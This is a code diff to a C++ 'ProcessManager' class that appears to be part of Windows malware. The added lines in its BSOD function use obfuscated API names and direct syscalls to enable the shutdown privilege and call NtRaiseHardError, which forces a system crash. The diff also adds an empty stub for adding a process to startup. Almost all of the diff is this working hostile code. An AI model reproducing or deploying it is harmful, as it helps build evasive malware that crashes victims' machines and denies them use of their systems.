@@ -151,15 +151,22 @@ void ProcessManager::SetThisContext(SecurityContext newContext) {
         this->m_Context = newContext;
 }
 
+void ProcessManager::AddProcessToStartup() {
+    // todo
+}
+
 void ProcessManager::BSOD() {
     BOOLEAN state = FALSE;
     ULONG   resp;
+    
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtRevertContainerImpersonation"));
+    SysNtRevertContainerImpersonation();
 
-    GetAndInsertSSN(NTDLL, ( char* ) HIDE("RtlAdjustPrivilege"));
-    SysRtlAdjustPrivilege(19, TRUE, FALSE, &state);
+    ::_RtlAdjustPrivilege adjust = GetFunctionAddress<::_RtlAdjustPrivilege>(NTDLL, (char*)HIDE("RtlAdjustPrivilege"));
+    adjust(19, TRUE, FALSE, &state);
 
-    GetAndInsertSSN(NTDLL, (char*)HIDE("NtRaiseHardError"));
-    SysNtRaiseHardError(0xEAC9012, 0, 0, NULL, 6, &resp);
+    GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtRaiseHardError"));
+    SysNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &resp);
 }
 
 void ProcessManager::LoadAllNatives() {
@@ -177,7 +184,6 @@ void ProcessManager::LoadAllNatives() {
     LoadNative<::_Process32NextW>((char*)HIDE("Process32NextW"), Kernel32DLL);
     LoadNative<::_Process32FirstW>((char*)HIDE("Process32FirstW"), Kernel32DLL);
     LoadNative<::_LoadLibrary>((char*)HIDE("LoadLibraryA"), Kernel32DLL);
-    LoadNative<::_RtlAdjustPrivilege>((char*)HIDE("RtlAdjustPrivilege"), NTDLL);
 
     this->m_NativesLoaded = TRUE;
 }
